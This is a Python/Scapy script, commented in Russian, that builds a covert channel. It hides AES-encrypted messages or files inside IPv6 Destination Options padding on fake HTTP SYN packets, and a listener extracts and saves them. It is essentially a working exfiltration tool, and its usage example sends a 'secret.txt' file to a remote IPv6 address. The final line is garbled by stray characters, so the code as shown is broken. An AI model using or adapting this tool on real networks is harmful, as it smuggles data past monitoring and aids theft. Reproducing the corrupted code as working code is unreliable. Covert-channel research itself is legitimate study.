#!/usr/bin/env python3
"""
IPv6 Destination Options Covert Channel (Python/Scapy 2025)
- Sender: прячет данные в PadN (type 1, length 0) Destination Options.
- Receiver: ловит IPv6 и вытаскивает/расшифровывает.
Ключ: 32-байтный для AES-256-GCM (одинаковый на обеих сторонах).
"""
import os
import sys
import time
import warnings
from scapy.all import *
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.layers.inet6 import HBHOptUnknown, PadN  # Фикс: импорт для PadN и unknown

# Игнорируем warning про iface в L3 send (безвредный)
warnings.filterwarnings("ignore", message="iface has no effect on L3 I/O send")

# Ключ (32 байта) — меняй на свой, но одинаковый на sender/receiver!
SECRET_KEY = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f'

def encrypt_data(plaintext: bytes) -> bytes:
    """AES-256-GCM шифрование с nonce."""
    aesgcm = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)  # 96-bit nonce
    ct = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ct  # Nonce + ciphertext + tag

def decrypt_data(ciphertext: bytes) -> bytes:
    """Расшифровка."""
    if len(ciphertext) < 28:  # Min: nonce(12) + tag(16)
        return b''
    aesgcm = AESGCM(SECRET_KEY)
    nonce = ciphertext[:12]
    ct = ciphertext[12:]
    try:
        return aesgcm.decrypt(nonce, ct, None)
    except:
        return b''  # Некорректные данные

def send_stego(dst_ip: str, payload: bytes):
    """Отправка: IPv6 + DestOpt + PadN + TCP."""
    encrypted = encrypt_data(payload)
    # PadN как HBHOptUnknown: otype=1, optdata=encrypted (optlen auto)
    padn_opt = HBHOptUnknown(otype=1, optdata=encrypted)
    dest_opt = IPv6ExtHdrDestOpt(options=[padn_opt])
    # Пакет: IPv6 + DestOpt + TCP SYN (имитируем HTTP)
    pkt = IPv6(dst=dst_ip) / dest_opt / TCP(sport=12345, dport=80, flags='S') / Raw(load="GET / HTTP/1.1\r\nHost: covert\r\n\r\n")
    # Тест сборки пакета перед отправкой
    try:
        built_pkt = bytes(pkt)
        print(f"[+] Packet built successfully ({len(built_pkt)} bytes)")
    except Exception as e:
        print(f"[!] Packet build error: {e}")
        return
    print(f"[+] Sending {len(encrypted)} encrypted bytes via DestOpt PadN to {dst_ip}")
    send(pkt, iface='lo', verbose=0)  # iface='lo' для loopback IPv6
    print("[+] Sent!")

def sniff_stego(pkt):
    """Приёмник: ловим IPv6 с DestOpt PadN."""
    if IPv6 not in pkt:
        return
    if pkt[IPv6].nh == 60 and IPv6ExtHdrDestOpt in pkt:  # nh=60 для DestOpt
        for opt in pkt[IPv6ExtHdrDestOpt].options:
            otype = getattr(opt, 'otype', None)
            optdata_len = len(getattr(opt, 'optdata', b''))
            # Фикс: ловим PadN или HBHOptUnknown с otype=1, и len>=28 (чтобы не padding)
            if isinstance(opt, (PadN, HBHOptUnknown)) and otype == 1 and optdata_len >= 28:
                data = bytes(opt.optdata)
                decrypted = decrypt_data(data)
                if decrypted:
                    try:
                        msg = decrypted.decode('utf-8')
                    except:
                        msg = f"[Binary data: {len(decrypted)} bytes]"
                    print(f"\n[+] COVERT DATA RECEIVED ({len(decrypted)} bytes): {msg}")
                    # Если файл — сохрани
                    if b'\x00' in decrypted or len(decrypted) > 100:
                        filename = f"received_{int(time.time())}.bin"
                        with open(filename, 'wb') as f:
                            f.write(decrypted)
                        print(f"[+] Saved as: {filename}")
                    return  # Только первый валидный

def main():
    # Фикс: правильный роут для ::1
    try:
        conf.route6.add(dst='::1/128', dev='lo')
        print("[+] Scapy IPv6 route for ::1/lo added")
    except Exception as e:
        print(f"[!] Route add warning: {e} (может быть уже добавлено)")

    if len(sys.argv) < 2:
        print("Usage:")
        print(" sudo python3 stego_ipv6.py send <dst_ipv6> <message_or_file>")
        print(" sudo python3 stego_ipv6.py listen")
        print("Example: sudo python3 stego_ipv6.py send ::1 'Hello stealth!'")
        print(" sudo python3 stego_ipv6.py send 2001:db8::1 secret.txt")
        return
    mode = sys.argv[1]
    if mode == 'send':
        if len(sys.argv) < 4:
            print("Error: need dst_ip and payload")
            return
        dst_ip = sys.argv[2]
        input_path = sys.argv[3]
        # Читаем файл или сообщение
        try:
            with open(input_path, 'rb') as f:
                payload = f.read()
            print(f"[+] Sending file: {input_path} ({len(payload)} bytes)")
        except FileNotFoundError:
            payload = input_path.encode('utf-8')
            print(f"[+] Sending message: {input_path}")
        send_stego(dst_ip, payload)
    elif mode == 'listen':
        print("[*] Listening for IPv6 DestOpt traffic... (Ctrl+C to stop)")
        # Фикс: BPF с SYN-флагом (только оригинальный SYN, без эха)
        try:
            sniff(iface='lo', filter="ip6 and ip6[6] == 60 and tcp[13] & 0x02 != 0", prn=sniff_stego, store=0)
        except Exception as e:
            print(f"[!] Sniff error: {e}")
            print("[!] Fallback: sniffing without BPF filter (slower, but works)")
            sniff(iface='lo', filter="ip6", prn=sniff_stego, store=0)
    else:
        print("Unknown mode. Use 'send' or 'listen'.")

if __name__ == "__main__":йййййййййй
    main()